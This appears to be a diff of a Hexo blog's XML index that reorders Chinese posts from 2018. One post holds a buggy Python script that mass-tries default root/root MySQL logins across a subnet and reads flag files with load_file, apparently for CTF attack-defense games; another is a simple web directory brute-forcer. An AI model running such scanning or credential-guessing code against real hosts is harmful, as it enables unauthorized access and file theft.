@@ -495,31 +495,6 @@
     
     
     <entry>
-      <title>【PythonScript】:PyMySQL</title>
-      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACPyMySQL/"/>
-      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACPyMySQL/</url>
-      
-        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p>突然想起来MYSQL是否也能做成自动GETFALG脚本呢。</p><a id="more"></a><p>这个还有点问题。可以自己修改下:)</p><pre><code class="language-Python">import pymysqlimport threadingfile=open('MySQLsave.txt','w+')def mysql_login(i):    ip='192.168.'+str(i)+'101'    username='root'    password='root'    payload = &quot;SELECT load_file('C:/flag*.txt')&quot;    try:        db = pymysql.connect(ip,username,password,&quot;mysql&quot;)        cursor = db.cursor()        cursor.execute(payload)        data = cursor.fetchall()        print(data)    except:        passfor i in range(1,249):    t = threading.Thread(target=mysql, args=(i,))    t.start()</code></pre><p><strong>转载请标明出处</strong></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> Python </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> Python </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>【PythonScript】:WebShell_urilb</title>
       <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell_urilb/"/>
       <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell_urilb/</url>
@@ -575,6 +550,31 @@
       <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACWeb_Dirs_Scanner/</url>
       
         <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p>看到一些web目录扫描器。自己也尝试写了一下xD</p><a id="more"></a><pre><code class="language-Python">import requestsimport randomimport reuser_agent_list = [{'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'},]user_agent = random.choice(user_agent_list)target = input(&quot;target host &gt;&quot;)dict_path_file = input(&quot;dicr file &gt;&quot;)def CheckURLProtocol():    Check = re.match(r&quot;http?://&quot;,target)    if Check == None:        print(&quot;[-]Example: http://127.0.0.1 or https://127.0.0.1&quot;)        exit(0)    else:        with open(dict_path_file) as f:            for dic in f.readlines():                url = target + str(dic)                url = url.replace(&quot;\n&quot;,&quot;&quot;)                try:                    r = requests.get(url,headers=user_agent)                    if r.status_code == 200:                        print(r.url)                except:                    pass</code></pre><p><strong>转载请标明出处</strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Python </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Python </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>【PythonScript】:PyMySQL</title>
+      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACPyMySQL/"/>
+      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACPyMySQL/</url>
+      
+        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p>突然想起来MYSQL是否也能做成自动GETFALG脚本呢。</p><a id="more"></a><p>这个还有点问题。可以自己修改下:)</p><pre><code class="language-Python">import pymysqlimport threadingfile=open('MySQLsave.txt','w+')def mysql_login(i):    ip='192.168.'+str(i)+'101'    username='root'    password='root'    payload = &quot;SELECT load_file('C:/flag*.txt')&quot;    try:        db = pymysql.connect(ip,username,password,&quot;mysql&quot;)        cursor = db.cursor()        cursor.execute(payload)        data = cursor.fetchall()        print(data)    except:        passfor i in range(1,249):    t = threading.Thread(target=mysql, args=(i,))    t.start()</code></pre><p><strong>转载请标明出处</strong></p>]]></content>
       
       
       <categories>
